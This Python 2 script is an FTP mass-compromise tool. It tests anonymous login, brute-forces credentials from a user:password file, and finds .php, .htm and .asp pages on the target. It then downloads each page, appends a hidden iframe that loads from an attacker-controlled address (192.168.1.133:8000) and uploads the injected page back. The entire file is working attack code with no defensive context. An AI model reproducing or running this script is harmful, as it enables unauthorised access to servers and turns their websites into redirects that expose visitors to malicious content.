import ftplib
import argparse
import time

def anonLogin(hostname):
	try:
		ftp = ftplib.FTP(hostname)
		ftp.login('anonymous','me@your.com')
		print('\n[*] '+str(hostname)+' FTP Anonymous Logon Succeeded!')
		ftp.quit()
		return True
	except Exception as e:
		print('\n[*] '+str(hostname)+' FTP Anonymous Logon Failed!')
		return False

def bruteLogin(hostname,user_pwd_file):
	upf = open(user_pwd_file,'r')
	for line in upf.readlines():
		time.sleep(1)
		r = line.strip('\n').split(':')
		userName = r[0]
		passWord = r[1]
		print('[-] Trying: '+userName+'/'+passWord)
		try:
			ftp = ftplib.FTP(hostname)
			ftp.login(userName,passWord)
			print('\n[+] '+str(hostname)+' FTP Logon Succeeded! '+userName+'---'+passWord)
			ftp.quit()
			return (userName,passWord)
		except Exception as e:
			pass
	print('\n[-] Could not brute force FTP credentials')
	return (None,None)

def returnDefault(ftp):
	try:
		dirList = ftp.nlst()
	except:
		dirList = []
		print ('[-] Could not list directory contents')
		print ('[-] Skipping To Next Target')
		return 
	retList = []
	for filename in dirList:
		fn = filename.lower()
		if '.php' in fn or '.htm' in fn or '.asp' in fn:
			print('\n[+] Found default page: '+filename)
			retList.append(filename)
	return retList

def injectPage(ftp,page,redirect):
	f = open(page + '.tmp','w')
	ftp.retrlines('RETR '+page,f.write)
	print('[+] Downloaded Page: '+page)
	f.write(redirect)
	f.close()
	print ('[+] Injected Malicious IFrame on: '+page)
	ftp.storlines('STOR '+page,open(page+'.tmp'))
	print('[+] Uploaded Injected Page: '+page)

def attack(username,password,tgthost,redirect):
	ftp = ftplib.FTP(tgthost)
	ftp.login(username,password)
	defPages = returnDefault(ftp)
	for defPage in defPages:
		injectPage(ftp,defPage,redirect)

def main():
	parser = argparse.ArgumentParser('usage%prog -H <target host> -r <redirect page> [-f <userpass file>]')
	parser.add_argument('-H',dest='tgthost',help='target host')
	#parser.add_argument('-r',dest='redirect')
	parser.add_argument('-f',dest='user_pwd_file',help='specify user/password file')
	args = parser.parse_args()
	tgthost = args.tgthost
	#redirect = args.redirect
	user_pwd_file = args.user_pwd_file
	username = None
	password = None
	if anonLogin(tgthost):
		username = 'anonymous'
		password = 'me@your.com'
		print '[+] Using Anonymous Creds to attack'
		attack(username,password,tgthost,redirect)
	elif user_pwd_file !=None:
		(username,password) = bruteLogin(tgthost,user_pwd_file)

	if password != None:
		print '[+] Using Creds: '+username + '/'+password +' to attack'
		attack(username,password,tgthost,redirect)

if __name__ == '__main__':
	redirect = "<iframe src=\"http://192.168.1.133:8000\"></iframe>"
	main()
